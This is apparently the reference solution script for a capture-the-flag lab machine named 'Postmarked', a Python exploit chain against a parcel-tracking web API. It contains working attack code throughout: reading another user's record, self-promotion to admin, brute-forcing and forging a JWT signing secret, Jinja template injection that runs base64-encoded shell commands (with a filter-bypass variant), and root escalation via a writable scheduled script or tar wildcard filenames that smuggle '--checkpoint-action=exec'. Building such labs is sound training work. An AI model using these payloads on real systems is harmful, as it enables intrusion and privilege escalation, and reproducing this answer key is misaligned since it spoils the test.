"""Reference solution for Postmarked. Usage: python3 - <easy|medium>  (prints {"user":..., "root":...})"""
import base64, hashlib, hmac, json, re, sys, time, urllib.error, urllib.request

BASE = "http://10.66.12.10"
DIFF = sys.argv[1]


def call(method, path, body=None, token=None):
    req = urllib.request.Request(BASE + path, method=method,
                                 data=json.dumps(body).encode() if body is not None else None)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")


def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")


def forge(secret, claims):
    head = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64(json.dumps(claims).encode())
    sig = b64(hmac.new(secret.encode(), head + b"." + body, hashlib.sha256).digest())
    return (head + b"." + body + b"." + sig).decode()


def check_sig(token, secret):
    h, b, s = token.split(".")
    want = b64(hmac.new(secret.encode(), (h + "." + b).encode(), hashlib.sha256).digest()).decode()
    return want == s


# 1. docs, register, login
_, docs = call("GET", "/api/v1/docs")
paths = [r["path"] for r in docs["routes"]]
print("docs lists admin route:", any("admin" in p for p in paths), file=sys.stderr)
call("POST", "/api/v1/auth/register", {"username": "hax", "password": "hax12345"})
_, tok = call("POST", "/api/v1/auth/login", {"username": "hax", "password": "hax12345"})
token = tok["token"]

# 2. BOLA: read the dispatcher's parcel (id 1) to find the admin route
s, p1 = call("GET", "/api/v1/parcels/1", token=token)
assert s == 200 and "/api/v1/admin/labels/preview" in p1["note"], p1
ADMIN = re.search(r"POST (/\S+)", p1["note"]).group(1)

# 3. become admin
if DIFF == "easy":
    s, me = call("PATCH", "/api/v1/me", {"role": "admin"}, token)
    assert me["role"] == "admin", me
    _, tok = call("POST", "/api/v1/auth/login", {"username": "hax", "password": "hax12345"})
    token = tok["token"]
else:
    s, me = call("PATCH", "/api/v1/me", {"role": "admin"}, token)
    assert me["role"] == "customer", "medium must not accept role: %s" % me
    secret = next(w for w in ["secret", "admin", "changeme", "letmein", "password123", "qwerty"] if check_sig(token, w))
    claims = json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "=="))
    claims["role"] = "admin"
    token = forge(secret, claims)


def sh(cmd):
    """Run a shell command on the server through the template injection."""
    enc = base64.b64encode(("(%s) 2>&1" % cmd).encode()).decode()
    if DIFF == "easy":
        tpl = '{{ lipsum.__globals__.os.popen("echo %s | base64 -d | sh").read() }}' % enc
    else:
        # No "__", "import" or "config" substrings allowed: build names at runtime.
        tpl = ('{{ (lipsum|attr("\\x5f\\x5fglobals\\x5f\\x5f")).os.popen("echo %s | base64 -d | sh").read() }}' % enc)
    s, r = call("POST", ADMIN, {"template": tpl}, token)
    assert s == 200, (s, r)
    return r["label"]


# 3b. the filter really blocks the obvious payload on medium, and SSTI math works
s, r = call("POST", ADMIN, {"template": "{{7*7}}"}, token)
assert s == 200 and r["label"] == "49", r
if DIFF == "medium":
    s, r = call("POST", ADMIN, {"template": "{{ lipsum.__globals__ }}"}, token)
    assert s == 400, "filter should reject __: %s" % r

who = sh("id -un")
assert who.strip() == "courier", who
user_flag = sh("cat /home/courier/user.txt").strip()

# 4. root via the timer job
if DIFF == "easy":
    sh("echo 'cat /root/root.txt > /tmp/root.out; chmod 644 /tmp/root.out' >> /opt/postbox/cleanup.sh")
else:
    assert "denied" in sh("echo x >> /opt/postbox/cleanup.sh").lower(), "medium job must not be writable"
    sh("cd /var/spool/postbox && printf 'cat /root/root.txt > /tmp/root.out; chmod 644 /tmp/root.out\\n' > x.sh"
       " && touch ./--checkpoint=1 && touch './--checkpoint-action=exec=sh x.sh'")
root_flag = ""
for _ in range(15):
    time.sleep(1)
    root_flag = sh("cat /tmp/root.out").strip()
    if root_flag.startswith("LF{"):
        break
print(json.dumps({"user": user_flag, "root": root_flag}))
